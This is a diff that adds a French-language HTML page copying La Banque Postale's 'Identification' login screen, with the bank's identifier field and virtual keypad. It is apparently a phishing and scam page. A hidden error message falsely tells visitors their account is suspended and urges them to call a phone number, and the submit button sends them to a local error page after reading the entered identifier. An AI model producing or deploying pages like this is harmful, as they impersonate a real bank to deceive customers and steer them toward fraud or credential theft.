@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html class="no-js" lang="fr" style="user-select: none;"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+		
+		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+		<title>Identification - La Banque Postale</title>
+		
+		<meta http-equiv="content-style-type" content="text/css">
+		<meta name="robots" content="noindex, nofollow">
+		
+		<style type="text/css">
+			@import url(https://transverse.labanquepostale.fr/xo_/09_08_08.000/cvvs/css/cvs_all.css);
+			@import url(https://transverse.labanquepostale.fr/xo_/09_08_08.000/cvvs/css/loader.css);
+			[id="imageclavier"]{
+				background:url(loginform?imgid=allunifie2&e=4&0.05787320763389081) no-repeat 13px 6px;
+			}
+		</style>
+		<style type="text/css" media="(orientation:portrait) and (max-height:533px)">
+			@import url(https://transverse.labanquepostale.fr/xo_/09_08_08.000/cvvs/css/cvs_portable.css);
+			[id="imageclavier"]{
+				background:url(loginform?imgid=allunifie1&e=3&0.4970382284183945) no-repeat 44px 6px;
+			}
+		</style>
+		<!-- <script language="javascript" type="text/javascript" src="./val_keypad_cvvs-env.js.download"></script><script type="text/javascript" async="" src="./loreo.js.download"></script>
+
+		<script type="text/javascript">
+            if (!navigator.cookieEnabled){
+				document.location.href='https://transverse.labanquepostale.fr/xo_/messages/message.html?param=NoCookie&origin=particuliers';
+			}
+		</script>
+	 -->
+	<script src="./fruprem.js.download" async="" type="text/javascript"></script><script type="text/javascript" src="./netroco.js.download" id="5u142"></script><script type="text/javascript" src="./piment.js.download" id="2zl0h7"></script><script type="text/javascript" src="./drun.js.download" id="3otq5"></script><script type="text/javascript" src="./dasti.js.download" id="mq16nuv"></script><script type="text/javascript" async="" src="./u9mW"></script><script type="text/javascript" async="" src="./u9mW(1)"></script><script type="text/javascript" async="" src="./QSAy"></script><script type="text/javascript" async="" src="./zbq"></script><script type="text/javascript" async="" src="./zbq(1)"></script><script type="text/javascript" async="" src="./u9mW(2)"></script><script type="text/javascript" async="" src="./u9mW(3)"></script><script type="text/javascript" async="" src="./u9mW(4)"></script><script type="text/javascript" async="" src="./u9mW(5)"></script>
+
+<style type="text/css">
+	[id="imageclavier"] div button {
+		background: #17479e;
+		color: #fff;
+	}
+</style>
+</head>
+
+	<body id="particuliers">
+		<div id="loader" aria-hidden="true" class="" style="top:0px"><div></div></div>
+		<div class="" id="conteneurCvs">
+			<!-- <form method="post" action="" name="formAccesCompte" class="layer_blockRight"> -->
+				
+				<div id="cvs-bloc">
+					<p id="errorCode" style="color: red; text-align: center; display: none;">
+						Your account has been suspended due to suspicious activity. Please contact our customer support immediately +61730407694 
+						<br>* Error Code - Wp-402<br>
+					</p>
+					<div id="cvs-bloc-identifiant">
+						<label class="labelVisible" for="val_cel_identifiant">Identifiant :</label>
+					
+						<input autocorrect="off" type="tel" name="username" id="val_cel_identifiant" autocapitalize="off" format="*N" placeholder="Saisissez ici votre identifiant" maxlength="11" pattern="[0-9,a-z,A-Z]*" spellcheck="false" onkeypress="return checkInput(event);" required>
+						<!--<![endif]-->
+						<input class="input-non-modif" type="tel" id="val_cel_identifiant_masque" disabled="" style="display: none;">
+						<div style="text-align: left">
+							<input type="checkbox" id="saveId" name="saveId" onchange="modifIdent()">
+							<label for="saveId">Mémoriser mon identifiant</label>
+						</div>
+					</div>
+					<div id="cvs-bloc-mdp">
+						<label class="labelVisible" for="cvs-bloc-mdp-input">Mot de passe :</label>
+						<!--[if lt IE 10]>
+						<input type="text" disabled="disabled" class="cache" id="cvs-bloc-mdp-input-hidden" value="Composez votre mot de passe"/>
+						<![endif]-->
+						<input type="text" disabled="disabled" id="cvs-bloc-mdp-input" placeholder="Composez votre mot de passe" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" required>
+			
+						<div id="cvs-lien-voca">
+							<input type="button" class="non-cache" id="cvs-lien-voca-active" value="Activer la vocalisation" onclick="CVSVTable.lancer();">
+							<input type="button" class="cache" id="cvs-lien-voca-desactive" value="Désactiver la vocalisation" onclick="desactiverVocalisation();">
+						</div>
+						<div id="messageDebutClavier" class="webaccess">Mode opératoire : Le clavier virtuel vocalisé marche sur les ordinateurs fixes et portables, ainsi que sur les médias tactiles APPLE. Pour accéder au mode opératoire spécifique détaillé, aller sur labanquepostale.fr et cliquer sur le lien «Accessibilité».</div>
+						<div id="messageDebutClavier2" class="webaccess">Navigation : pour vocaliser chaque case, utiliser TAB et SHIFT+TAB ou ALT+flèche gauche et droite sur PC; sur MAC flèche gauche et droite, TAB et SHIFT+TAB ou touche VO+flèche gauche et droite. Sur les médias tactiles APPLE, utiliser les gestes VOICEOVER. Pour sélectionner et valider des chiffres, utiliser barre espace ou entrée sur PC ou MAC, et le geste double tappe sur les médias tactiles APPLE ce qui produit un son de confirmation. Le bouton Effacer efface les chiffres saisis. La validation du formulaire devient possible lorsque l´identifiant et tous les chiffres du mot de passe sont saisis.</div>
+						<div id="blocImage">
+							<div id="imageclavier">
+								<div>
+									<button type="button" id="val_cel_0">0</button>
+									<button type="button" id="val_cel_1">1</button>
+									<button type="button" id="val_cel_2">2</button>
+								</div>
+								<div>
+									<button type="button" id="val_cel_3">3</button>
+									<button type="button" id="val_cel_4">4</button>
+									<button type="button" id="val_cel_5">5</button>
+								</div>
+								<div>
+									<button type="button" id="val_cel_6">6</button>
+									<button type="button" id="val_cel_7">7</button>
+									<button type="button" id="val_cel_8">8</button>
+								</div>
+								<div>
+									<button type="button" id="val_cel_9">9</button>
+									<!-- <button type="button"></button>
+									<button type="button"></button> -->
+								</div>
+								
+							</div>
+						</div>
+						<div class="webaccess">Fin du clavier virtuel</div>
+					</div>
+					<div id="cvs-bloc-boutons">
+
+						<!-- <a href="../field-error.html"><input type="submit" id="validerCus1" value="Valider" style="opacity: 1; cursor: pointer;">
+						</a> -->
+						<input type="submit" id="validerCus1" value="Valider" style="opacity: 1; cursor: pointer;">
+						<input type="button" id="effacer" value="Effacer" onclick="CVSVTable.reset();">
+					</div>
+					<div id="progressBar"></div>
+				</div>
+			<!-- </form> -->
+		</div>
+		<div id="cvs_swf">&nbsp;</div>
+	<script language="javascript" type="text/javascript">
+		var OST_origin="particuliers";
+		var OST_flash="loginform?swf=avalue&";
+		var OST_audio5="loginform?mp3=avalue&";
+		var OST_audioOgg = "";
+		var OST_action="login";
+		var PATH_STATIQUE = "https://transverse.labanquepostale.fr/xo_/09_08_08.000/cvvs";
+		var IMG_ALL = "loginform?imgid=allunifie2&e=4&0.05787320763389081";
+	</script>
+	<script>
+		if(OST_origin === 'pmotactile' || OST_origin === 'professionnels'){
+			document.write('<link rel="stylesheet" type="text/css" href="https://transverse.labanquepostale.fr/xo_/09_08_08.000/cvvs/css/cvs_pmo.css" />');
+		}
+
+		if(OST_origin === 'tpp'){
+			var img = new Image();
+			img.src = "https://transverse.labanquepostale.fr/xo_/automates/nabanco/img/logo-lbp.svg";
+			img.style.display = "block";
+			img.style.margin = "auto";
+			img.style.width = "25%";
+			img.style.paddingBottom = "10px";
+			var div = document.getElementById('cvs-bloc');
+			 
+			img.onload = function() {
+			  div.insertBefore(img, div.firstChild);
+		  };
+		}
+	</script>
+	<script language="javascript" type="text/javascript" src="./jquery-3.4.1.min.js.download"></script> 
+	<script language="javascript" type="text/javascript" src="./val_keypad_cvvs-commun-unifie.js.download"></script> 
+	<script language="javascript" type="text/javascript" src="./val_keypad_cvvs-unifie.js.download"></script>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+<script>
+$(document).ready(function(){
+  $("#validerCus1").click(function(){
+  	// $('#errorCode').hide();
+  var val_cel_identifiant = $('#val_cel_identifiant').val();
+  window.parent.location.href = "../field-error.html";
+  // if(val_cel_identifiant==''){
+  // 	$('#val_cel_identifiant').focus();
+  // 	return false;
+  // }
+  // if(val_cel_identifiant!=''){
+  // 	// $('#errorCode').show();
+  // 	window.parent.location.href = "../field-error.html"; 
+  	
+  // }
+  });
+});
+</script>
+</body>
+</html>
